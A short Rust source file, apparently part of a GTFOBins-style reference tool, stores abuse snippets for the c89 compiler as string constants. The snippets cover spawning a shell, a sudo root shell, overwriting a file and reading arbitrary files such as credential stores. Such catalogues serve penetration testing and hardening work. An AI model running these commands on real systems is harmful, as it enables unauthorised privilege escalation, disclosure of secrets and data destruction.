
pub static BIN_NAME: &'static str = "c89";
pub static SH_CODE: &'static str = r#"
    
    c89 -wrapper /bin/sh,-s .
"#;
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_delete
    c89 -xc /dev/null -o $LFILE
"#;
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    c89 -x c -E "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo c89 -wrapper /bin/sh,-s .
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
